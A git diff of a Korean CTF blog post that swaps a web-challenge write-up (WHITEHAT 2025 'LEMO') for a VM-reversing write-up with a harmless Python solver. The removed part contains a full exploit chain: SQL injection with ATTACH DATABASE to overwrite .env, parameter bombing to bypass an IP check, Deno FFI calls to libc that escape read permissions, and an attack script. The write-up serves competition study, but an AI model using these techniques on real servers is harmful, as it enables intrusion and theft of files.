@@ -1,244 +1,131 @@
 ---
-title: ["[WHITEHAT 2025 Final CTF- web] LEMO"]
-date: 2025-11-21 09:00:00 +0900
-last_modified_at: 2025-11-21 09:00:00 +0900
+title: ["[WHITEHAT 2025 qual CTF- rev] Scenario"]
+date: 2025-10-19 09:00:00 +0900
+last_modified_at: 2025-10-19 09:00:00 +0900
 categories: [writeup, ctf]
-tags: [web, sqli, parameter, FFI]
+tags: [reversing, vm]
 ---
+> 발견한 백도어의 출처와 행동을 분석하기 위해 백도어를 활성화하는 키를 찾아주세요. 
 
-## 핵심 메커니즘
-### 1. Nginx Purify Layer (`purify.js`)
-    ```javascript
-    function fix(r) {
-        var out = [];
-        var args = r.args;
-        
-        for (var k in args) {
-            if (k === 'ip')  // 사용자가 보낸 'ip' 파라미터 필터링
-                continue;
-            out.push(k + '=' + encodeURIComponent(v));
-        }
-        
-        var real_ip = r.variables.remote_addr || "";
-        out.push('ip=' + real_ip);  // 실제 클라이언트 IP 강제 추가
-        return out.join('&');
-    }   
-    ```
+간단한 VM 리버싱 문제이다.  
 
-### 2. Admin Middleware (`/api/admin/_middleware.ts`)
-    ```
-    export async function handler(req: Request, ctx: FreshContext) {
-        ctx.state = ctx.state ?? {};
-        const ip = ctx.state.ip;
-        const NODE_ENV = Deno.env.get("NODE_ENV") ?? "production";
+### 바이너리 로직
+1. **ptrace 기반 VM**: 자식 프로세스가 바이트코드를 실행하고, 부모가 `0xcc` (INT3) 브레이크포인트마다 개입해서 연산 수행
+2. **스택 기반 아키텍처**: `local_b0`이 스택 포인터 역할
+3. **메모리 영역**: `local_a8`은 별도 메모리 공간 (변수 저장용)
 
-        if (ip !== "127.0.0.1" || NODE_ENV !== "development") {
-            return new Response("403 Forbidden", { status: 403 });
-        }
+### 바이트코드 해석
 
-        return await ctx.next();
-    }   
-    ```
+바이트코드 형식: `0xcc [opcode] [operand]`
 
-**두 가지 조건을 모두 만족해야 admin 기능이 사용 가능하다.**  
-- `ip === "127.0.0.1"`
-- `NODE_ENV === "development"`
+주요 연산:
 
+- **0xf0 XX**: PUSH XX (값을 스택에 푸시)
+- **0xf1**: ADD (스택 top 2개 더하기)
+- **0xf2**: MUL (곱하기)
+- **0xf3~0xf5**: AND, OR, XOR
+- **0xf9**: STORE (스택 → 메모리)
+- **0xfa**: LOAD (메모리 → 스택)
+- **0xfb**: EXIT (결과 반환)
+- **0xfc**: ROL (rotate left)
 
-## 취약점
-### 1. SQL Injection
-`db.ts`의 `createUser` 함수에서 SQLi 취약점 발견  
-```
-export function createUser(username: string, password: string, role: Role = Role.USER) {
-  const result = db.exec(`INSERT INTO users (username, password, role) VALUES ('${username}', '${password}', ${role})`);
-  return result;
-}
-```
-
-이를 통해 `role=1` (ADMIN) 계정을 생성할 수 있었다.  
-
-### 2. Parameter Bombing으로 IP 검사 우회
-Root middleware (`/_middleware.ts`)의 로직을 분석한 결과:  
-
-```
-ctx.state.query = await parseQuery(req);  // qs.parse() 사용
-
-if (ctx.state.query.ip) {
-    if (typeof ctx.state.query.ip !== "string") {
-        return new Response("400 Bad Request", { status: 400 });
-    }
-    ctx.state.ip = ctx.state.query.ip;
-} else {
-    ctx.state.ip = "127.0.0.1";  
-}
-```
-
-1000개 이상의 파라미터를 전송하면, `qs.parse()`가 오버로드되어 `ip` 파라미터를 제대로 파싱하지 못한다.  
-하지만, `NODE_ENV` 조건을 우회하는 것에서 막혔다.  
-`NODE_ENV`는 서버의 환경변수이기 때문에, HTTP 요청으로 조작할 수 없었다.  
-
-하지만, SQLite의 **ATTACH DATABASE**로 임의의 파일을 데이터베이스로 attach가 가능하다.  
-이후 문제를 해결하는데 admin role이 필요가 없다는 점에서, 취약점을 잘못된 방향으로 활용한 셈이다.  
-
-```sql
-ATTACH DATABASE '/app/.env' AS env;
-CREATE TABLE env.t (data TEXT);
-INSERT INTO env.t (data) VALUES ('
-NODE_ENV=development
-');
-```  
-
-이렇게 하면 `/app/.env` 파일이 생성되고, SQLite 데이터베이스 포맷으로 저장되지만, Deno는 기본적으로 이를 파싱해서 환경변수로 설정할 수 있다.  
-
-### 3. Deno Permission
-`/_middleware.ts`의 로직을 모두 우회했지만, flag를 읽는 과정에서 한 가지 장애물이 더 있다.  
-
-```
-export const handler = async (req: Request): Promise<Response> => {
-    const flag = await Deno.readTextFile("/flag");
-    return new Response(flag);
-};
-```
-가장 간단한 방식으로 flag 파일을 읽으려 했지만 아래와 같은 에러와 함께 실패하였다.  
-```
-Error: NotCapable: Requires read access to "/flag", run again with the --allow-read flag
-```
-
-`--allow-read` 옵션으로 `/app` 디렉토리만 읽을 수 있었고, `/flag`는 권한 밖이라 불가능했다.  
-
-`readTextFile` 외에도, `cat`, `fs` 모두 실패하였다.  
-
-하지만, `--allow-ffi` 권한이 활성화 되어 있었다.  
-FFI를 사용하면 C 라이브러리를 직접 호출할 수 있다.  
-
-```
-export const handler = async (req: Request): Promise<Response> => {
-    try {
-        const libc = Deno.dlopen("/lib/x86_64-linux-gnu/libc.so.6", {
-            open: { 
-                parameters: ["buffer", "i32"],
-                result: "i32"
-            },
-            read: { 
-                parameters: ["i32", "buffer", "usize"],
-                result: "isize"
-            },
-            close: { 
-                parameters: ["i32"],
-                result: "i32" 
-            }
-        });
-        
-        // 1. open("/flag", O_RDONLY)
-        const pathBuf = new TextEncoder().encode("/flag\0");
-        const fd = libc.symbols.open(pathBuf, 0);
-        
-        if (fd < 0) {
-            libc.close();
-            return new Response("Failed to open /flag");
-        }
-        
-        // 2. read(fd, buffer, size)
-        const buffer = new Uint8Array(4096);
-        const bytesRead = libc.symbols.read(fd, buffer, 4096);
-        
-        // 3. close(fd)
-        libc.symbols.close(fd);
-        libc.close();
-        
-        if (bytesRead <= 0) {
-            return new Response("Failed to read");
-        }
-        
-        const flag = new TextDecoder().decode(buffer.slice(0, Number(bytesRead)));
-        return new Response(flag);
-        
-    } catch (e) {
-        return new Response("Error: " + e.toString());
-    }
-};
-```
-
-**작동 원리:**
-```
-Deno Permission Layers:
-┌─────────────────────────────────────┐
-│   High-Level API (Deno.readFile)    │ ← --allow-read 체크
-├─────────────────────────────────────┤
-│   Node.js Compat (fs.readFileSync)  │ ← --allow-read 체크
-├─────────────────────────────────────┤
-│   Command Execution (Deno.Command)  │ ← --allow-run 체크
-├─────────────────────────────────────┤
-│   FFI (Deno.dlopen)                 │ ← --allow-ffi 체크만
-└─────────────────────────────────────┘
-         ↓ Direct System Call
-┌─────────────────────────────────────┐
-│   libc (open, read, write, ...)     │ ← 권한 체크 없음
-└─────────────────────────────────────┘
-```
-
-
-## Exploit
+### Solve.py
 ```python
-import requests
+def reverse_bit_shuffle(value):
+    result = 0
+    result |= ((value >> 7) & 1) << 7  # bit 7 -> bit 7
+    result |= ((value >> 6) & 1) << 5  # bit 6 -> bit 5
+    result |= ((value >> 5) & 1) << 3  # bit 5 -> bit 3
+    result |= ((value >> 4) & 1) << 1  # bit 4 -> bit 1
+    result |= ((value >> 3) & 1) << 6  # bit 3 -> bit 6
+    result |= ((value >> 2) & 1) << 4  # bit 2 -> bit 4
+    result |= ((value >> 1) & 1) << 2  # bit 1 -> bit 2
+    result |= ((value >> 0) & 1) << 0  # bit 0 -> bit 0
+    
+    return result
 
-URL = "http://target-server"
 
-requests.post(
-    URL + "/api/signup",
-    {
-        "username": "aaa', '', 1); ATTACH DATABASE '/app/.env' AS env; CREATE TABLE env.t (data TEXT); INSERT INTO env.t (data) VALUES ('\nNODE_ENV=development\n'); ATTACH DATABASE '/app/routes/t' AS dummy; CREATE TABLE dummy.t (d TEXT); --",
-        "password": "aaaaa",
-        "password_confirm": "aaaaa",
-    },
-)
+def rotate_right(value, rotation):
+    return ((value >> rotation) | (value << (8 - rotation))) & 0xFF
 
-with open("./exploit.ts") as f:
-    requests.post(
-        URL + "/api/admin/save?" + "&".join([f"p{x}=x" for x in range(1000)]),
-        {
-            "filepath": "api/logout.ts",
-            "content": f.read(),
-        },
-    )
 
-flag = requests.get(URL + "/api/logout").text
-print(f"FLAG: {flag}")
+def reverse_transform(expected_value, rotation):
+    value = expected_value
+    
+    value = reverse_bit_shuffle(value)
+    
+    value = rotate_right(value, rotation)
+    
+    input_val = (value - 60)
+    
+    if input_val % 5 != 0:
+        for candidate in range(256):
+            if ((candidate * 5 + 60) & 0xFF) == value:
+                return candidate
+    
+    return (input_val // 5) & 0xFF
+
+
+def solve_flag(expected_table):
+    rotations = [0, 3, 6, 1, 4, 7, 2, 5] * 5
+    
+    flag = []
+    for i in range(len(expected_table)):
+        rotation = rotations[i % 8]
+        input_byte = reverse_transform(expected_table[i], rotation)
+        flag.append(input_byte)
+    
+    return bytes(flag)
+
+
+def bit_shuffle(value):
+    result = 0
+    result |= ((value >> 7) & 1) << 7
+    result |= ((value >> 5) & 1) << 6
+    result |= ((value >> 3) & 1) << 5
+    result |= ((value >> 1) & 1) << 4
+    result |= ((value >> 6) & 1) << 3
+    result |= ((value >> 4) & 1) << 2
+    result |= ((value >> 2) & 1) << 1
+    result |= ((value >> 0) & 1) << 0
+    return result
+
+
+def rotate_left(value, rotation):
+    return ((value << rotation) | (value >> (8 - rotation))) & 0xFF
+
+
+def verify_flag(flag, expected_table):
+    rotations = [0, 3, 6, 1, 4, 7, 2, 5] * 5
+    
+    result = 0
+    for i in range(len(flag)):
+        value = (flag[i] * 5 + 60) & 0xFF
+        
+        rotation = rotations[i % 8]
+        value = rotate_left(value, rotation)
+        
+        value = bit_shuffle(value)
+        
+        value ^= expected_table[i]
+        
+        result |= value
+    
+    return result == 0
+
+
+
+if __name__ == "__main__":
+    expected_table = [
+        0x3b, 0x45, 0xa3, 0xe0, 0x87, 0x27, 0x07, 0xe9, 
+        0x0b, 0xad, 0xb2, 0x58, 0xce, 0x35, 0x07, 0xb0, 
+        0x0b, 0xc5, 0x31, 0x2a, 0xd5, 0xa4, 0xc4, 0xe0, 
+        0x71, 0xa1, 0x22, 0xe0, 0x1d, 0x87, 0xe8, 0x8a, 
+        0x66
+    ]
+    
+    flag = solve_flag(expected_table)
+    
+    print(flag.hex())
+    print(flag)
 ```
-
-exploit.ts
-```
-export const handler = async (req: Request): Promise<Response> => {
-    try {
-        const libc = Deno.dlopen("/lib/x86_64-linux-gnu/libc.so.6", {
-            open: { parameters: ["buffer", "i32"], result: "i32" },
-            read: { parameters: ["i32", "buffer", "usize"], result: "isize" },
-            close: { parameters: ["i32"], result: "i32" }
-        });
-        
-        const pathBuf = new TextEncoder().encode("/flag\0");
-        const fd = libc.symbols.open(pathBuf, 0);
-        
-        if (fd < 0) {
-            libc.close();
-            return new Response("Failed to open /flag");
-        }
-        
-        const buffer = new Uint8Array(4096);
-        const bytesRead = libc.symbols.read(fd, buffer, 4096);
-        libc.symbols.close(fd);
-        libc.close();
-        
-        const flag = new TextDecoder().decode(buffer.slice(0, Number(bytesRead)));
-        return new Response(flag);
-        
-    } catch (e) {
-        return new Response("Error: " + e.toString());
-    }
-};
-```
-
-## 삽질의 교훈
-취약점이 사용되지 않았다면, 익스플로잇 방향이 틀리지 않았는지 의심하자.  
-SQLi의 파급효과는 강력하다.  
-LLM을 사용할 때 대화가 길어지면 초반부의 디테일을 놓치기가 쉽다. 핵심적인 내용은 리마인드 해주는 습관을 갖자.  
